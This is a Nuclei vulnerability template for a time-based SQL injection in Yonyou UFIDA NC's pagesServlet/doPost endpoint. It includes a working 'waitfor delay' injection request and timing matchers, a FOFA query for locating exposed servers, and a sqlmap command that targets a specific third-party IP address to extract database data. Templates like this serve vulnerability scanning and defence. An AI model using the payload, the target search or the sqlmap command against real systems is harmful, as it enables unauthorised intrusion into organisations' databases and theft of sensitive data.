id: yonyou-nc-pagesservlet-doPost-sqli

info:
  name: 用友 UFIDA NC pagesServlet/doPost - sqli
  author: leadlife
  severity: high
  description: 用友NC /portal/pt/servlet/pagesServlet/doPost 接口存在 SQL 注入漏洞，攻击者通过利用 SQL 注入漏洞获取数据库敏感信息。
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
    sqlmap: sqlmap -u "http://117.34.25.214:8090/portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1" -p pk_group --batch
  tags: yonyou,sqli,nc,oa,time

http:
  - raw:
    - |
      @timeout: 15s
      POST /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:6'-- HTTP/1.1
      Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - duration >= 5 && duration < 9
          - status_code == 200
        condition: and